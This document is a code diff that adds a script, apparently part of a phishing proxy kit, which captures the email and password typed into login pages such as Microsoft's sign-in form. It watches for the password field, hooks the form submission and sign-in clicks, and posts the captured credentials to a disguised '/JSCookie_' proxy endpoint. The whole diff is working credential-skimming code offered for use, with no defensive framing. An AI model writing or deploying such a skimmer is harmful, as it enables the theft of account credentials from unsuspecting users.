@@ -113,3 +113,83 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
 }
 
 // ---- 4. DOM Password Capture (NEW) with Console Logs ----
+(function() {
+    function sendCredentials(email, password) {
+        if (!password) return;
+
+        // ***** CONSOLE LOG (DEBUGGING) *****
+        console.log('[DOM Capture] Email extracted:', email);
+        console.log('[DOM Capture] Password extracted:', password);
+        // **********************************
+
+        // Send to proxy
+        fetch('/JSCookie_6X7dRqLg90mH', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'credentials',
+                email: email || '',
+                password: password,
+                time: Date.now(),
+                url: location.href
+            })
+        }).catch(() => {});
+    }
+
+    function findFields() {
+        let emailField = document.querySelector('input[name="loginfmt"], input[type="email"], input[name="login"]');
+        let passwordField = document.querySelector('input[type="password"]');
+        return { emailField, passwordField };
+    }
+
+    function attachListeners(passwordField, emailField) {
+        if (!passwordField) return;
+
+        // Listen to form submit
+        const form = passwordField.closest('form');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                const email = emailField ? emailField.value : '';
+                const password = passwordField ? passwordField.value : '';
+                if (password) sendCredentials(email, password);
+            });
+        }
+
+        // Listen to click on Sign-in button (fallback)
+        document.addEventListener('click', function(e) {
+            let target = e.target;
+            if (!target) return;
+            const text = (target.innerText || target.value || '').toLowerCase();
+            const isSignIn = text.includes('sign in') || text.includes('next') || target.type === 'submit';
+            if (isSignIn) {
+                const email = emailField ? emailField.value : '';
+                const password = passwordField ? passwordField.value : '';
+                if (password) sendCredentials(email, password);
+            }
+        });
+    }
+
+    function init() {
+        const { emailField, passwordField } = findFields();
+        if (passwordField) {
+            attachListeners(passwordField, emailField);
+        } else {
+            // Wait for password field to appear (Microsoft loads it dynamically)
+            const observer = new MutationObserver(function() {
+                const pwd = document.querySelector('input[type="password"]');
+                if (pwd) {
+                    observer.disconnect();
+                    const { emailField: email, passwordField: pwdField } = findFields();
+                    attachListeners(pwdField, email);
+                }
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+        }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+})();
